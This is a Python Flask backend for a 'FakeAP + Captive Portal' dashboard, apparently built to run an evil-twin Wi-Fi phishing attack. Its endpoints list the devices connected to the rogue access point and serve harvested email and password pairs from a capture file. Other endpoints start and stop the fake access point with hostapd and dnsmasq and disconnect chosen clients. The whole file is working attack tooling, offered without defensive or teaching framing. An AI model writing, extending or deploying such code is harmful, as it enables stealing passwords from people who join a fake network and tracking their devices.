#!/usr/bin/env python3
"""API Backend for FakeAP + Captive Portal UI"""
import os
import json
import time
import subprocess
import glob
from flask import Flask, jsonify, request
from flask_cors import CORS

BASE = "/root/wifi"
HOSTAPD_CONF = f"{BASE}/conf/hostapd/lucas_2ghz.conf"
DNSMASQ_CONF = f"{BASE}/conf/dnsmasq/lucas_2ghz.conf"
CAPTURED_DIR = f"{BASE}/captures/credenciais"
LOG_DIR = f"{BASE}/var/logs"
PCAP_DIR = f"{BASE}/captures/dispositivos"
LEASE_FILE = "/var/lib/misc/dnsmasq.leases"

app = Flask(__name__)
CORS(app)

def run(cmd, timeout=5):
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return r.stdout, r.stderr, r.returncode
    except Exception as e:
        return "", str(e), -1

# ─── STATUS ───────────────────────────────────────────────────────────────────

@app.route("/api/status")
def api_status():
    hostapd_out, _, _ = run(["pgrep", "hostapd"])
    ap_running = bool(hostapd_out.strip())
    dnsmasq_out, _, _ = run(["pgrep", "dnsmasq"])
    dhcp_running = bool(dnsmasq_out.strip())
    captive_out, _, _ = run(["pgrep", "-f", "captive_portal.py"])
    portal_running = bool(captive_out.strip())

    uptime = 0
    if ap_running:
        out, _, _ = run(["ps", "-o", "etime=", "-p", hostapd_out.strip().split("\n")[0]])
        if out.strip():
            parts = out.strip().split(":")
            if len(parts) == 2:
                uptime = int(parts[0]) * 60 + int(parts[1])
            elif len(parts) == 3:
                uptime = int(parts[0]) * 3600 + int(parts[1]) * 60 + int(parts[2])

    clients_count = 0
    try:
        with open(LEASE_FILE) as f:
            clients_count = sum(1 for _ in f)
    except Exception:
        pass

    ssid = "Lucas_2GHz"
    channel = "6"
    try:
        with open(HOSTAPD_CONF) as f:
            for line in f:
                if line.startswith("ssid="):
                    ssid = line.strip().split("=", 1)[1]
                if line.startswith("channel="):
                    channel = line.strip().split("=", 1)[1]
    except Exception:
        pass

    return jsonify({
        "ap_running": ap_running,
        "dhcp_running": dhcp_running,
        "portal_running": portal_running,
        "uptime": uptime,
        "clients_count": clients_count,
        "ssid": ssid,
        "channel": channel,
        "interface": "buS1"
    })

# ─── CLIENTES ─────────────────────────────────────────────────────────────────

@app.route("/api/clients")
def api_clients():
    clients = []
    leases = {}
    try:
        with open(LEASE_FILE) as f:
            for line in f:
                parts = line.strip().split()
                if len(parts) >= 4:
                    exp, mac, ip, name = parts[0], parts[1], parts[2], parts[3]
                    leases[mac] = {"ip": ip, "hostname": name, "expires": exp}
    except Exception:
        pass

    stations = {}
    out, _, _ = run(["iw", "dev", "buS1", "station", "dump"])
    if out:
        current_mac = None
        for line in out.split("\n"):
            line = line.strip()
            if line.startswith("Station "):
                current_mac = line.split()[1]
                stations[current_mac] = {}
            elif current_mac and ":" in line:
                key, _, val = line.partition(":")
                stations[current_mac][key.strip()] = val.strip()

    for mac, info in stations.items():
        ip = leases.get(mac, {}).get("ip", "N/A")
        hostname = leases.get(mac, {}).get("hostname", "N/A")
        signal = info.get("signal", "N/A")
        tx_bytes = info.get("tx bytes", "0")
        rx_bytes = info.get("rx bytes", "0")
        connected_sec = info.get("connected time", "0")
        inactive = info.get("inactive time", "0")
        clients.append({
            "mac": mac,
            "ip": ip,
            "hostname": hostname if hostname != "*" else "Desconhecido",
            "signal": signal,
            "tx_bytes": tx_bytes,
            "rx_bytes": rx_bytes,
            "connected_time": connected_sec,
            "inactive_time": inactive,
            "online": True
        })

    for mac, lease in leases.items():
        if mac not in stations:
            clients.append({
                "mac": mac,
                "ip": lease["ip"],
                "hostname": lease["hostname"] if lease["hostname"] != "*" else "Desconhecido",
                "signal": "N/A",
                "tx_bytes": "0",
                "rx_bytes": "0",
                "connected_time": "0",
                "inactive_time": "0",
                "online": False
            })

    return jsonify(clients)

# ─── CREDENCIAIS ──────────────────────────────────────────────────────────────

@app.route("/api/credentials")
def api_credentials():
    creds = []
    try:
        with open(f"{CAPTURED_DIR}/todas.txt") as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                parts = line.split(" | ")
                entry = {}
                for p in parts:
                    if ":" in p:
                        k, _, v = p.partition(":")
                        entry[k.strip().lower()] = v.strip()
                if entry.get("email") or entry.get("senha"):
                    creds.append(entry)
    except Exception:
        pass

    return jsonify(creds[::-1])

# ─── LOGS ─────────────────────────────────────────────────────────────────────

@app.route("/api/logs")
def api_logs():
    logs = []
    files = [
        f"{LOG_DIR}/monitor_24h.log",
        f"{BASE}/src/captive.log"
    ]
    for fpath in files:
        try:
            with open(fpath) as f:
                for line in f:
                    line = line.strip()
                    if line:
                        logs.append(line)
        except Exception:
            pass
    return jsonify(logs[-100:])

# ─── CONFIG ───────────────────────────────────────────────────────────────────

@app.route("/api/config")
def api_config():
    config = {"hostapd": {}, "dnsmasq": {}}
    try:
        with open(HOSTAPD_CONF) as f:
            for line in f:
                line = line.strip()
                if "=" in line and not line.startswith("#"):
                    k, v = line.split("=", 1)
                    config["hostapd"][k] = v
    except Exception:
        pass
    try:
        with open(DNSMASQ_CONF) as f:
            for line in f:
                line = line.strip()
                if "=" in line and not line.startswith("#"):
                    k, v = line.split("=", 1)
                    config["dnsmasq"][k] = v
    except Exception:
        pass
    return jsonify(config)

# ─── TOGGLE AP ────────────────────────────────────────────────────────────────

@app.route("/api/ap/toggle", methods=["POST"])
def api_toggle_ap():
    data = request.get_json() or {}
    action = data.get("action", "toggle")

    hostapd_out, _, _ = run(["pgrep", "hostapd"])
    is_running = bool(hostapd_out.strip())

    if action == "stop" or (action == "toggle" and is_running):
        run(["pkill", "hostapd"])
        run(["pkill", "dnsmasq"])
        return jsonify({"status": "stopped"})

    run(["hostapd", "-B", HOSTAPD_CONF], timeout=10)
    time.sleep(0.5)
    run(["pkill", "dnsmasq"])
    run(["dnsmasq", "-C", DNSMASQ_CONF, "-i", "buS1", "--bind-interfaces"], timeout=10)
    return jsonify({"status": "started"})

# ─── KICK CLIENT ──────────────────────────────────────────────────────────────

@app.route("/api/client/kick", methods=["POST"])
def api_kick_client():
    data = request.get_json() or {}
    mac = data.get("mac", "")
    if not mac:
        return jsonify({"error": "MAC required"}), 400
    out, err, rc = run(["iw", "dev", "buS1", "station", "del", mac])
    if rc == 0:
        return jsonify({"status": "kicked", "mac": mac})
    return jsonify({"error": err or out}), 500

# ─── SERVE FRONTEND ───────────────────────────────────────────────────────────

@app.route("/")
def serve_frontend():
    return app.send_static_file("index.html")

@app.route("/<path:path>")
def serve_static(path):
    return app.send_static_file(path)

if __name__ == "__main__":
    import os
    static_dir = os.path.join(os.path.dirname(__file__), "frontend", "dist")
    if os.path.isdir(static_dir):
        app.static_folder = static_dir
        app.static_url_path = ""
    print("[+] UI Server rodando em http://0.0.0.0:9000")
    app.run(host="0.0.0.0", port=9000, debug=False)